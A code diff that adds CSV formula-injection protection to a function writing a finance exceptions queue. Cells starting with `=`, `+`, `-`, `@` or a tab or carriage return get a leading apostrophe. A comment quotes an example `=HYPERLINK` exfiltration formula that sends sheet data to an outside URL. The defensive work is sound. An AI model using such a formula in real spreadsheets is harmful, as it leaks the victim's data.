@@ -273,11 +273,38 @@ def build_exception_list(result: RunResult) -> tuple[ExceptionItem, ...]:
     return tuple(items)
 
 
+# Excel, LibreOffice and Sheets all evaluate a cell that begins with one of
+# these as a formula. `=HYPERLINK("http://…"&A1,"click")` exfiltrates whatever
+# the sheet can see as soon as somebody clicks it, and `@`, `+` and `-` reach
+# the same evaluator.
+_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _inert(value: str) -> str:
+    """Make a cell safe to open in a spreadsheet without making it unreadable.
+
+    This file is the one artifact the project asks a human to open, and in
+    production its evidence column carries bank narration and gateway payment
+    descriptions -- text a paying customer chooses. That is attacker-controlled
+    input arriving in an operator's spreadsheet, which is CSV injection with a
+    finance team on the receiving end.
+
+    A leading apostrophe is the fix rather than stripping the character: the
+    operator still has to be able to read the evidence and match it against the
+    ledger, so the cell has to survive intact. Spreadsheets treat the prefix as
+    "this is text" and do not display it.
+    """
+    return f"'{value}" if value[:1] in _FORMULA_LEADERS else value
+
+
 def write_exceptions(items: Sequence[ExceptionItem], path: str | Path) -> Path:
     """Write the queue as CSV, header included even when the queue is empty.
 
     An empty file with a header says "nothing outstanding". A zero-byte file
     says "the job did not run", and those two must not look the same on disk.
+
+    Every cell is passed through :func:`_inert` on the way out. See its
+    docstring: the queue is opened in Excel by the person it is written for.
     """
     destination = Path(path)
     destination.parent.mkdir(parents=True, exist_ok=True)
@@ -285,7 +312,9 @@ def write_exceptions(items: Sequence[ExceptionItem], path: str | Path) -> Path:
         writer = csv.DictWriter(handle, fieldnames=COLUMNS)
         writer.writeheader()
         for item in items:
-            writer.writerow(item.as_row())
+            writer.writerow(
+                {column: _inert(value) for column, value in item.as_row().items()}
+            )
     return destination
 
 
